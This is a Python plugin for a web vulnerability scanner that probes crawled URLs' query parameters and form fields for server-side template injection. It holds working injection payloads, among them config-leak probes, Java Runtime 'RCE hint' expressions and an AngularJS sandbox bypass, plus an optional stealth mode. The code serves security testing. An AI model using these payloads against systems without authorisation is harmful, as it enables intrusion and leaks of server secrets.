#!/usr/bin/env python3
"""
SSTI (V10.3 Precision) — Server-Side Template Injection detection.
Injeta payloads reais para Jinja2, Django, Mako, Twig, Spring, Smarty e verifica execução.
Inclui POST testing, payloads de RCE chain hints, e httpx.Client reuse.
V10.3: Reutiliza sessão httpx, dedup de resultados por (url, param).
"""
import json
import time
import httpx
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT, get_user_agent
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

def _build_payloads(deep: bool = False):
    payloads = [
        ("{{7777*7777}}", "60481729"),            # Jinja2, Twig
        ("${7777*7777}", "60481729"),             # Freemarker, Velocity
        ("<%= 7777*7777 %>", "60481729"),         # ERB (Ruby)
        ("#{7777*7777}", "60481729"),             # Slim, Pug
    ]
    if deep:
        payloads.extend([
            ("{{config}}", "Config"),    # Flask/Jinja leak
            ("{{settings.DATABASES}}", "'default'"), # Django leak hint (unique expected)
            ("${{7777*7777}}", "60481729"),          # Spring Expression Language
            ("{{7*'7777777'}}", "7777777777777777777777777777777777777777777777777"),    # Type testing
            ("@(7777*7777)", "60481729"),            # Razor
            ("{{'7'*7777777}}", "7777777777777777777777777777777777777777777777777"),    # Pebble
            ("{{variable.getClass().forName('java.lang.Runtime')}}", "java.lang.Runtime"), # Pebble RCE
            ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"), # Spring EL RCE
            ("${applicationScope}", "ApplicationScope"), # JSP EL
            ("${pageContext}", "PageContext"), # JSP EL
        ])
    
    # V10.2: Payloads adicionais para mais engines e RCE chain hints
    payloads_v10_2 = [
        ("{%debug%}", "TEMPLATES"),        # Django debug
        ("{{self}}", "TemplateReference"), # Jinja2 self reference
        ("${T(java.lang.Runtime)}", "java.lang.Runtime"),  # Spring SpEL RCE hint
        ("{{range.constructor(\"return 1+1\")()}}", "2"),   # AngularJS sandbox bypass
        ("#set($x=7777*7777)${x}", "60481729"),       # Velocity
        ("{{\"allma\".toUpperCase()}}", "ALLMA"),  # Freemarker/Twig string method
        ("*{7777*7777}", "60481729"),                 # Thymeleaf
    ]
    payloads.extend(payloads_v10_2)
    
    return payloads

# V10.6: Blacklist de expected values que aparecem naturalmente em JS/HTML
# (frameworks de monitoring como New Relic, Datadog, Sentry contêm estas strings)
_EXPECTED_BLACKLIST = {
    "secret_key", "license_key", "licensekey", "api_key", "apikey",
    "config", "debug", "true", "false", "null", "undefined",
    "applicationid", "accountid", "agentid",
}


def _test_ssti(client: httpx.Client, url: str, param: str, deep: bool = False, target: str = "") -> dict | None:
    """Testa payloads SSTI em um parâmetro específico com baseline check. Reutiliza sessão.
    V10.5: Filtro de escopo, double-check confirmation, baseline hash."""
    import hashlib

    # V10.5: Filtro de escopo — ignorar URLs fora do target
    if target and target not in url:
        return None

    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    
    # Baseline
    try:
        baseline_resp = client.get(url, headers={"User-Agent": get_user_agent()})
        baseline_body = baseline_resp.text
        baseline_hash = hashlib.sha256(baseline_body.encode(errors='ignore')).hexdigest()
    except Exception:
        return None

    payloads = _build_payloads(deep)

    # V10.5: Payloads de confirmação para double-check
    CONFIRMATION_PAYLOADS = [
        ("{{8888*8888}}", "78996544"),
        ("{{9999*9999}}", "99980001"),
        ("${8888*8888}", "78996544"),
    ]

    for payload, expected in payloads:
        time.sleep(REQUEST_DELAY)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

        try:
            resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
            body = resp.text
            
            # V10.3: Ignorar falhas tipo 403/404 se a sig coincidir com a página de erro do WAF
            if resp.status_code >= 400:
                continue

            # V10.5: Ignorar se o body é idêntico ao baseline (redirect body)
            resp_hash = hashlib.sha256(body.encode(errors='ignore')).hexdigest()
            if resp_hash == baseline_hash:
                continue

            # V10.6: Rejeitar expected values na blacklist (strings comuns em JS/HTML)
            if expected.lower().strip("'") in _EXPECTED_BLACKLIST:
                continue

            # Confirmação V10: Resultado esperado surge no body e NÃO estava no baseline
            if expected.lower() in body.lower() and expected.lower() not in baseline_body.lower():
                # V10.6: Anti-Reflection Filter (If expected is part of the payload, ensure raw payload isn't just cleanly reflected)
                if expected.lower() in payload.lower() and payload.lower() in body.lower():
                    continue
                    
                # V10.5: Para expected genéricos (< 5 chars), exigir double-check
                needs_confirmation = len(expected) < 5

                if needs_confirmation:
                    confirmed = False
                    for conf_payload, conf_expected in CONFIRMATION_PAYLOADS:
                        if conf_payload == payload:
                            continue  # Usar payload diferente
                        time.sleep(REQUEST_DELAY)
                        qs[param] = [conf_payload]
                        conf_query = urlencode(qs, doseq=True)
                        conf_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, conf_query, parsed.fragment))
                        try:
                            conf_resp = client.get(conf_url, headers={"User-Agent": DEFAULT_USER_AGENT})
                            if conf_resp.status_code < 400 and conf_expected in conf_resp.text and conf_expected not in baseline_body:
                                confirmed = True
                                break
                        except Exception:
                            pass
                    if not confirmed:
                        continue  # Falso positivo — não confirmado

                # Extrair snippet para facilitar comprovação visual
                idx = body.lower().find(expected.lower())
                start = max(0, idx - 40)
                end = min(len(body), idx + len(expected) + 40)
                snippet = body[start:end].replace('\n', ' ').strip()
                
                return {
                    "url": url,
                    "test_url": test_url,
                    "parameter": param,
                    "method": "GET",
                    "payload": payload,
                    "expected": expected,
                    "status": resp.status_code,
                    "risk": "CRITICAL",
                    "type": "SSTI",
                    "confirmed": True,
                    "details": f"Vulnerabilidade Detectada: SSTI via '{param}' (Payload: {payload} -> {expected})<br><b>Snippet Mágico:</b> <code>...{snippet}...</code>",
                    "request_raw": format_http_request(resp.request),
                    "response_raw": format_http_response(resp),
                }
        except Exception:
            pass
    return None


def _test_ssti_post(client: httpx.Client, url: str, deep: bool = False) -> dict | None:
    """V10.2: Testa SSTI via POST em formulários. Reutiliza sessão."""
    # Obter baseline
    try:
        baseline_resp = client.get(url, headers={"User-Agent": DEFAULT_USER_AGENT})
        baseline_body = baseline_resp.text
    except Exception:
        return None

    # Parâmetros comuns de input em forms
    form_params = ["name", "email", "search", "q", "query", "message", "comment", "title", "input", "text"]
    payloads = _build_payloads(deep)[:6]  # Subset para não sobrecarregar

    for param in form_params:
        for payload, expected in payloads:
            time.sleep(REQUEST_DELAY)
            try:
                data = {param: payload}
                resp = client.post(url, data=data, headers={"User-Agent": DEFAULT_USER_AGENT})
                body = resp.text
                
                # Ignorar status 400+ gerados por WAF blocks
                if resp.status_code >= 400:
                    continue

                if expected.lower().strip("'") in _EXPECTED_BLACKLIST:
                    continue
                if expected.lower() in body.lower() and expected.lower() not in baseline_body.lower():
                    # Extrair snippet
                    idx = body.lower().find(expected.lower())
                    start = max(0, idx - 40)
                    end = min(len(body), idx + len(expected) + 40)
                    snippet = body[start:end].replace('\n', ' ').strip()
                    return {
                        "url": url,
                        "parameter": param,
                        "method": "POST",
                        "payload": payload,
                        "expected": expected,
                        "status": resp.status_code,
                        "risk": "CRITICAL",
                        "type": "SSTI",
                        "details": f"SSTI via POST: Parâmetro '{param}' (Payload: {payload} -> {expected})<br><b>Snippet Mágico:</b> <code>...{snippet}...</code>",
                        "request_raw": format_http_request(resp.request),
                        "response_raw": format_http_response(resp),
                    }
            except Exception:
                pass
    return None


def run(context: dict):
    target = context.get("target")
    deep = context.get("deep", False)
    stealth = context.get("stealth", False)
    
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟧───────────────────────────────────────────────────────────🟧\n"
        f"   🧪 {C.BOLD}{C.CYAN}SSTI (TEMPLATE INJECTION) SCANNER (V10.3 PRECISION){C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END} | Deep: {deep} | Stealth: {stealth}\n"
        f"🟧───────────────────────────────────────────────────────────🟧\n"
    )

    outdir = ensure_outdir(target, "ssti")
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    
    if not urls_file.exists():
        warn("⚠️ urls_200.txt não encontrado.")
        summary = {"tests_run": 0, "urls_checked": 0, "findings": 0, "status": "NO_INPUT"}
        (outdir / "ssti_results.json").write_text(json.dumps([], indent=2))
        (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))
        return []

    all_urls = [l.strip() for l in urls_file.read_text(errors="ignore").splitlines() if l.strip()]

    # Filtrar candidatos GET (com query string)
    candidates = []
    for url in all_urls:
        if "?" in url:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for param in qs:
                candidates.append((url, param))

    # V10.3: Dedup por (normalized_url, param) para evitar duplicatas
    seen = set()
    deduped_candidates = []
    for url, param in candidates:
        key = (url.rstrip("/"), param)
        if key not in seen:
            seen.add(key)
            deduped_candidates.append((url, param))
    
    candidates = deduped_candidates[:80]
    # V11: Reduzir workers para evitar race conditions com httpx.Client compartilhado
    max_workers = 2 if stealth else 5
    
    info(f"   📋 Testando {len(candidates)} parâmetros com payloads reais de engines")

    results = []
    tests_run = 0
    found_keys = set()  # V10.3: Dedup de resultados por (url, param)

    # V10.3: Criar UMA sessão httpx e reutilizar para todos os testes
    with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True) as client:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(_test_ssti, client, url, param, deep, target): (url, param) for url, param in candidates}

            for future in as_completed(futures):
                try:
                    res = future.result()
                    tests_run += 1
                    if res:
                        # V10.3: Dedup por (url, param)
                        dedup_key = (res["url"], res["parameter"])
                        if dedup_key not in found_keys:
                            found_keys.add(dedup_key)
                            results.append(res)
                            info(f"   🔴 {C.RED}[CRITICAL]{C.END} {res['url']} — '{res['parameter']}' -> {res['payload']}")
                except Exception:
                    pass

        # V10.2: Teste POST em deep mode (reusa mesma sessão)
        if deep:
            info(f"   🔎 [DEEP] Testando SSTI via POST em formulários...")
            post_candidates = [u for u in all_urls if any(kw in u.lower() for kw in ["/search", "/contact", "/comment", "/feedback", "/form", "/submit"])]
            post_candidates = list(set(post_candidates))[:20]
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(_test_ssti_post, client, url, deep): url for url in post_candidates}
                for future in as_completed(futures):
                    try:
                        res = future.result()
                        tests_run += 1
                        if res:
                            dedup_key = (res["url"], res["parameter"])
                            if dedup_key not in found_keys:
                                found_keys.add(dedup_key)
                                results.append(res)
                                info(f"   🔴 {C.RED}[CRITICAL POST]{C.END} {res['url']} — '{res['parameter']}' -> {res['payload']}")
                    except Exception:
                        pass

    output_file = outdir / "ssti_results.json"
    output_file.write_text(json.dumps(results, indent=2, ensure_ascii=False))

    summary = {"tests_run": tests_run, "urls_checked": len(candidates), "findings": len(results), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))

    if results:
        success(f"\n   🧪 {len(results)} SSTI Confirmado(s)!")
    else:
        info(f"   ✅ 0 SSTI em {len(candidates)} candidatos.")

    success(f"   📂 Salvos em {output_file}")
    return results
